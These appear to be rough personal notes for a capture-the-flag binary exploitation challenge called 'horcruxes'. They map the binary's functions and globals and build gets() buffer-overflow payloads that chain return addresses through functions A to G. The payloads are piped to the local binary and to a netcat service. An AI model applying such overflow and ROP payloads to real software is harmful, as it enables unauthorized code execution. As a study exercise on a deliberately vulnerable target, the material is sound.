init_ABCDEFG: loads a random seed from dev/urandom -> seeds with srand() -> gets and stores random values for A(0x7c)-G(0x94) -> adds them all and stores in 0x98
A/B/C...: just prints the respective globalebx = 8043f90 -> globals here (3f90)
0x08041604 -- gets for "how much xp" into buffer at ebp-0x74 (100 byte buffer)
0x08041696 -- right before return from ropme
run < /tmp/beyload

---valid input
echo -n -e "GGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG\x0a" > /tmp/beyload_test

---proof-of-concept return directly into A()
echo -n -e "\x31\x0a\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x01\x01\x01\x01\xf9\x14\x04\x08\xa0\x51\x04\x08\x90\x3f\x04\x08\x58\xdb\xff\xff\x9d\x12\x04\x08\x0a" > /tmp/beyload
x/36x $esp

---proof-of-concept 2 returns directly A() and B()
echo -n -e "\x31\x0a\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x01\x01\x01\x01\xf9\x14\x04\x08\xa0\x51\x04\x08\x90\x3f\x04\x08\x58\xdb\xff\xff\x57\x15\x04\x08\x6e\x15\x04\x08\x0a" > /tmp/beyload

\x00\x00\x00\x00 ; local '0' idk what it is
\xf9\x14\x04\x08 ; instruction in main right before ropme call
\xa0\x51\x04\x08 ; local with interesting value
\x90\x3f\x04\x08 ; global offset table
\x58\xdb\xff\xff ; ? pointer to saved stackbase..?
\x01\x15\x04\x08 ; return address

0x 0804 129d ; A
0x 0804 12cf ; B
0x 0804 1301 ; C
0x 0804 1333 ; D
0x 0804 1365 ; E
0x 0804 1397 ; F
0x 0804 15c9 ; G
0x 0804 150b ; ropme() entry point

ret:    pop -> jmp
call:   push -> jmp
enter:  push ebp -> mov esp into ebp -> sub [localspace] from esp
leave:  mov ebp into esp -> pop into ebp

payload:
\x31\x0a            ; answer the first prompt
\x11 * 100          ; fill the gets buffer
\x00\x00\x00\x00\xf9\x14\x04\x08\xa0\x51\x04\x08\x90\x3f\x04\x08\x58\xdb\xff\xff ; preserve ropme stack
\x9d\x12\x04\x08    ; overwrite return address w/ entrypoint of A()
\xcf\x12\x04\x08    ; store return address = entrypoint of B()
\x01\x13\x04\x08    ; store return address = entrypoint of C()
\x33\x13\x04\x08    ; store return address = entrypoint of D()
\x65\x13\x04\x08    ; store return address = entrypoint of E()
\x97\x13\x04\x08    ; store return address = entrypoint of F()
\xc9\x13\x04\x08    ; store return address = entrypoint of G()
\x0b\x15\x04\x08    ; store return address = entrypoint of ropme()
\x0a                ; newline for gets()

--- fingers crossed
{ echo -n -e "\x31\x0a\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x01\x01\x01\x01\xf9\x14\x04\x08\xa0\x51\x04\x08\x90\x3f\x04\x08\x58\xdb\xff\xff\x9d\x12\x04\x08\xcf\x12\x04\x08\x01\x13\x04\x08\x33\x13\x04\x08\x65\x13\x04\x08\x97\x13\x04\x08\xc9\x13\x04\x08\x0b\x15\x04\x08\x0a\x00" ; cat; } | ./horcruxes

--- fingers crossed
{ echo -n -e "\x31\x0a\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x01\x01\x01\x01\xf9\x14\x04\x08\xa0\x51\x04\x08\x90\x3f\x04\x08\x58\xdb\xff\xff\x9d\x12\x04\x08\xcf\x12\x04\x08\x01\x13\x04\x08\x33\x13\x04\x08\x65\x13\x04\x08\x97\x13\x04\x08\xc9\x13\x04\x08\x0b\x15\x04\x08\x0a\x00" ; cat; } | nc 0 9032